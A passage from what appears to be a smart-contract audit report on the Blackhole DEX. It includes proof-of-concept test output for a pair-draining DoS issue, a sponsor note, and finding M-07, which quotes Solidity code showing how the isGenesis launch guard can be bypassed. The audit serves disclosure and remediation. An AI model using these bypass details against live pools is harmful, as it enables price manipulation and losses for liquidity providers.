class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDAI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFRAX\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eafter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e drain: \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eAttempting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewhich\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e finished: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSuccessfully\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edemonstrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eand\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereverted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ✔ \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eshould\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edemonstrate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ethe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evulnerability\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eleading\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eDOS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (1262\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ems\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-60\"\u003emaxvzuvex\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-49\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/Pair.sol#L344\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\" aria-label=\"m 07 isgenesisflag is ineffective to control add liquidity flow in routerv2addliquidity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-168\"\u003e[M-07] \u003ccode\u003eisGenesis\u003c/code\u003e flag is ineffective to control add liquidity flow in \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-279\"\u003emaxzuvex\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L384\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-5\" aria-label=\"finding description 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe check that prevents external liquidity additions to “Genesis Pool” pairs before their official launch are insufficient. The \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e check can be bypassed once any LP tokens exist (even dust) and \u003ccode\u003ePair.mint()\u003c/code\u003e also has no \u003ccode\u003eisGenesis\u003c/code\u003e check at all, letting direct initial liquidity supply. This damages the controlled launch, let potential price manipulation and launch disruption and clearly stated intended behaviour.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e guard issue:\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// contracts/RouterV2.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eensure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisGenesis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;NA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_safeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_safeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eIf \u003ccode\u003eisGenesis(pair)\u003c/code\u003e is true and \u003ccode\u003etotalSupply()\u003c/code\u003e is 0, the inner condition \u003ccode\u003e(true \u0026#x26;\u0026#x26; true)\u003c/code\u003e is true. The \u003ccode\u003erequire(!true)\u003c/code\u003e fails, correctly blocking.\u003c/li\u003e\n\u003cli\u003eOnce \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e (for example after official GenesisPool launch, or a prior dust minting by an attacker), this check becomes \u003ccode\u003erequire(!(true \u0026#x26;\u0026#x26; false))\u003c/code\u003e which is \u003ccode\u003erequire(true)\u003c/code\u003e, allowing anyone to add liquidity using the router if the \u003ccode\u003eisGenesis\u003c/code\u003e flag hasn’t been cleared yet.\u003c/li\u003e\n\u003cli\u003eThis means if \u003ccode\u003eisGenesis\u003c/code\u003e flag is not set to false immediately before the GenesisPool contract calls \u003ccode\u003eaddLiquidity\u003c/code\u003e, then after the GenesisPool successfully adds its liquidity (making \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e), any subsequent call to \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e for that pair would pass the check, letting external LPs in prematurely.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ePair.mint()\u003c/code\u003e is not restricted:\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/Pair.sol:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// gas savings, must be defined here since totalSupply can update in _mintFee\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esqrt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINIMUM_LIQUIDITY\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINIMUM_LIQUIDITY\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// permanently lock the first MINIMUM_LIQUIDITY tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, 